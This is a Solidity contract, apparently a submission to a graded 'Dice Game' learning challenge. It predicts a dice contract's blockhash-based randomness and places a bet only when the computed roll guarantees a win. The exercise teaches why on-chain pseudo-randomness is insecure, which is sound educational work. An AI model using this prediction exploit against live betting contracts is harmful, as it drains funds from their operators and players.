pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import { DiceGame } from "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
	DiceGame public diceGame;

	constructor(address payable diceGameAddress) {
		diceGame = DiceGame(diceGameAddress);
	}

	// Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
	function withdraw(address _addr, uint256 amount) public {
		require(msg.sender == owner(), "Only Owner can withdraw");

		(bool sent, ) = _addr.call{ value: amount }("");
		require(sent, "Failed to withdraw");
	}

	// Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
	function riggedRoll() public {
		if (address(this).balance < 0.002 ether) {
			revert("Not Enough balance");
		}

		// from where to get the nounce in the DiceGame contract
		uint256 nonce = diceGame.nonce();

		bytes32 prevHash = blockhash(block.number - 1);

		console.log("\t", "   Rigged Game Roll block.number :", block.number);

		bytes32 hash = keccak256(
			abi.encodePacked(prevHash, address(diceGame), nonce)
		);

		uint256 roll = uint256(hash) % 16;

		console.log("\t", "   Nounce:", nonce);

		console.log("\t", "   Riggerd Game Roll:", roll);

		if (roll < 5) {
			diceGame.rollTheDice{ value: 0.002 ether }();
		} else {
			revert("Wont win the roll");
		}
	}

	// Include the `receive()` function to enable the contract to receive incoming Ether.
	// Executed when calling contract without CALLDATA
	receive() external payable {}
}
